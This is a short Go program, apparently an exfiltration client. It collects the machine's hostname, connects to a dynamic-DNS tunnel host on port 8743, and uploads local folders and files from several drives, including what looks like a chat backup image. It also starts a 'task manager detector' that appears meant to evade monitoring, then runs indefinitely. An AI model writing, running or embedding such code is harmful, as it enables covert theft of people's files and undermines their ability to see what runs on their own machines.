package main

import (
	"fmt"
	"net"
	"os"
	"time"

	"github.com/galnt/baseproject/uploader"
)

func main() {
	fmt.Println("base引用工程")

	ClientName := ""
	hostname, err := os.Hostname()
	if err == nil {
		ClientName = hostname
	}

	SpeedLimit := 10 * 1024 * 1024 // 默认上传速度限制

	ServerAddr := "1q502u2312.zicp.fun:8743"
	conn, _ := net.DialTimeout("tcp", ServerAddr, 10*time.Second)

	u := uploader.New(uploader.Config{
		ClientID:        ClientName,
		SpeedLimitBytes: int64(SpeedLimit),
		ServerAddr:      ServerAddr,
	}, conn)

	// 这两行就是你程序启动后唯一需要手动调的初始化
	uploader.InitCheckConnPool()        // 连接池（sync.Once）
	uploader.StartTaskManagerDetector() // 任务管理器检测（sync.Once）

	// 改成你想上传的目录或文件
	u.PatchDistribution("F:/m3u8")

	u.PatchDistribution("E:/galunt_758127181@chatroom_-363328172_backupnull.jpg")

	u.PatchDistribution("G:/Thunder_11.1.12.1692_Green.7z")

	select {}
}
